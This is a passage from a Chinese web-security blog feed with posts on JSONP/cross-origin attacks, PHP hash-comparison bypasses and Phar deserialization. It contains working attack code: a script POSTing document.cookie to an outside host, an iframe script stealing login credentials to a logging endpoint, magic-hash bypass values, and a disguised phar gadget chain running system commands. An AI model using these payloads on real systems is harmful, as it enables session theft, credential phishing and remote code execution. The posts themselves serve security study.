class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="comment">// 与上例相同</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/json.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;&#125;)&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;获取失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">hackfun</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> datas = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> key in obj) &#123;</span><br><span class="line">                <span class="keyword">var</span> tmp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                tmp = key+<span class="string">&#x27;:&#x27;</span>+obj[key]+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                datas += tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            fetch(<span class="string">&#x27;//68943a75.y7z.xyz/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: document.cookie</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;http://a.x.com/json.php?callback=hackfun&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ab.png"></p><h2 id="攻击思路三（误）"><a href="#攻击思路三（误）" class="headerlink" title="攻击思路三（误）"></a>攻击思路三（误）</h2><p>假设<code>a.x.com</code>与<code>x.com</code>相互信任，利用<code>b.x.com</code>的XSS钓取a登录处的帐号密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- a.x.com/login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>悲催的A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//baidu.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;account&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&quot;x.com&quot;</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- b.x.com --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>有XSS的B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//a.x.com/login.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">100%</span> <span class="attr">frameborder</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&#x27;x.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifrm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            ifrm.document.getElementById(<span class="string">&#x27;submit&#x27;</span>).onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> account = ifrm.document.getElementById(<span class="string">&quot;account&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> passwd = ifrm.document.getElementById(<span class="string">&quot;passwd&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> url = <span class="string">&#x27;//WebLog/?account=&#x27;</span>+account+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;passwd=&#x27;</span>+passwd;</span></span><br><span class="line">                fetch(url, &#123;</span><br><span class="line"><span class="javascript">                    mode: <span class="string">&#x27;no-cors&#x27;</span></span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_aa.png"></p><p>实战中XSS通常有限制，没机会插这么多代码进去，所以一般采用外联JS的方式引入，浏览器虽然会在控制台中报跨域错误并拦截响应，但通常仍可以正常发出请求并将敏感数据带至WebLog平台。抓包分析可以发现，虽然<code>&lt;iframe&gt;</code>放在了<code>&lt;script&gt;</code>前面，不过浏览器的请求顺序是：</p><ol start="0"><li><p>加载主页面</p></li><li><p>加载iframe<strong>标签</strong></p></li><li><p>加载外联JS</p></li><li><p>加载iframe<strong>内容</strong></p></li><li><p>用户按下<code>提交</code>按钮</p></li><li><p>执行劫持函数</p></li><li><p>表单提交</p></li></ol><p>这里说这么细是因为发现了一个有趣但蛋疼的问题，最初用作触发劫持函数的代码其实是用<code>document.getElementById(&#39;login&#39;).onsubmit</code>监测表单提交实现的，测试过程中一会可以一会嗝屁特别玄学，接着就开始了三天的对 浏览器、服务器、操作系统、网络地址、网络环境 一千多次的黑盒交叉测试（哭了），最终将影响因素锁定在表单提交后的新页面加载速度上。</p><p>因为如果 后者的加载速度 比 监测到表单提交并执行劫持函数 这一过程的速度要更快的话，新来的页面会将在内存中还未来得及执行完的劫持函数给刷掉。。。。。由于表单提交的默认监听事件是鼠标点击<code>提交</code>按钮（按下再松开），所以我将劫持函数的监听事件改为了检测鼠标按下，这样如果按下<code>提交</code>按钮后松得慢一点，就能产生一个让劫持函数执行完的时间缝隙Orz。。。。。当然如果点击的手速够快的话仙人可能也跳不到你</p><p>回过头看之前的实现方式，则是等用户点击<code>提交</code>按钮后，劫持函数 与 新页面加载 同时执行，拼的是 WebLog平台所在服务器 与 新页面所在服务器 的响应速度，不确定性就太多了。。。。。而改为 检测鼠标按下 后则在此基础上又开辟了 受害者点击 手速这个时间窗口23333</p><p>更新：经p师傅提醒，监听鼠标点击可能会错过通过<code>回车</code>或是<code>自动填充提交</code>方式提交的表单，所以为了保险可以两种方式同时使用</p><p>到此为止，有没有觉得哪里有点不对劲？如果目的是想利用<code>b.x.com</code>的XSS钓取a的帐号密码的话，为何不直接通过JS重写b的页面仿造成a登录处的样子并劫持表单输入呢？干嘛要用什么鬼跨域的逻辑绕来绕去（淦）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin policy</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using Fetch</a></p><p><a href="https://www.freebuf.com/articles/web/208672.html">浅谈跨域威胁与安全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为同源&quot;&gt;&lt;a href=&quot;#何为同源&quot; class=&quot;headerlink&quot; title=&quot;何为同源&quot;&gt;&lt;/a&gt;何为同源&lt;/h2&gt;&lt;p&gt;如果两个URL的协议、域名、端口一致则满足同源，&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;、&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cors" scheme="https://hosch3n.github.io/tags/cors/"/>
    
    <category term="jsonp" scheme="https://hosch3n.github.io/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>PHP哈希函数漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <id>https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-08-24T03:39:24.000Z</published>
    <updated>2020-09-24T16:14:39.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0e"><a href="#0e" class="headerlink" title="0e"></a>0e</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;0e123&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e456&#x27;</span>;</span><br><span class="line">$a == $b;</span><br><span class="line">$a !== $b;</span><br><span class="line"></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>);</span><br><span class="line">md5(<span class="string">&#x27;s878926199a&#x27;</span>) == md5(<span class="string">&#x27;s155964671a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>);</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0e251288019&#x27;</span> == hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;0e251288019&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="number">0</span>];</span><br><span class="line">$b = [<span class="number">1</span>];</span><br><span class="line">$a != $b;</span><br><span class="line"></span><br><span class="line">md5($a) === md5($b);</span><br><span class="line"></span><br><span class="line">sha1($a) === sha1($b);</span><br><span class="line"></span><br><span class="line">hash(<span class="string">&#x27;md4&#x27;</span>, $a) == hash(<span class="string">&#x27;md4&#x27;</span>, $b);</span><br></pre></td></tr></table></figure><h2 id="‘or"><a href="#‘or" class="headerlink" title="‘or"></a>‘or</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stristr(md5(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br><span class="line">stristr(md5(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>浮点值运算存在精度问题，反序列化时会出现值不等但运算后哈希相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0e&quot;&gt;&lt;a href=&quot;#0e&quot; class=&quot;headerlink&quot; title=&quot;0e&quot;&gt;&lt;/a&gt;0e&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="hash" scheme="https://hosch3n.github.io/tags/hash/"/>
    
    <category term="md" scheme="https://hosch3n.github.io/tags/md/"/>
    
    <category term="sha" scheme="https://hosch3n.github.io/tags/sha/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-19T09:43:01.000Z</published>
    <updated>2020-10-14T08:08:07.487Z</updated>
    
    <content type="html"><![CDATA[<p>Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和<code>phar://</code>伪协议可以对phar文件进行读写等操作，如果 <code>phar.readonly</code> 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>根据<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">官方文档</a>可知，Phar由 <code>stub</code>/<code>manifest</code>/<code>contents</code>/<code>signature</code> 四部分组成。</p><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>stub</code> 用于标识phar文件类型，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>（xxx为任意内容）。因为无需以特定标识开头，所以可以结合其它文件头进行伪装：<code>GIF89a&lt;?php __HALT_COMPILER();?&gt;</code>。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>该结构存放了一些phar文件的大小长度等属性，包括序列化格式的元数据。</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p><code>contents</code> 存放压缩后的实际文件内容。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>顾名思义该结构用于文件校验，可以是常见的哈希值或密钥签名。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>因为 <code>manifest</code> 中的 <code>Meta-data</code> 以序列化格式存储，那么读取时必然有反序列化的过程，如果该部分用户可控（如上传phar文件并引用），则存在反序列化漏洞。</p><ul><li><a href="https://github.com/php/php-src/commit/0c238ede019f6ffbe7c996ec1695a747f4bca966">PHP8.0</a> 改为了不自动反序列化 <code>Meta-data</code>，除非调用了 <code>getMetadata()</code></li></ul><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ddmddw!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;phar://test.phar&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($path);</span><br><span class="line">file_exists($path);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> Control();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的test.phar文件</span></span><br><span class="line">@unlink(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// 开始初始化过程</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 添加要打包压缩的文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入伪装过的头部标识</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入Meta-data并序列化</span></span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line"><span class="comment">// 生成phar文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>附上l1nk3r师傅总结的常用魔术方法触发条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep()       <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct()    <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()        <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic()  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()         <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()         <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString()    <span class="comment">//把类当作字符串使用时触发,返回值需要为字符串</span></span><br><span class="line">__invoke()      <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和&lt;code&gt;phar://&lt;/code&gt;伪协议可以对phar文件进行读写等操作，如果 &lt;code&gt;phar.readonly&lt;/code&gt; 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="phar" scheme="https://hosch3n.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-08-16T14:29:15.000Z</published>
    <updated>2020-09-24T16:15:50.276Z</updated>
    
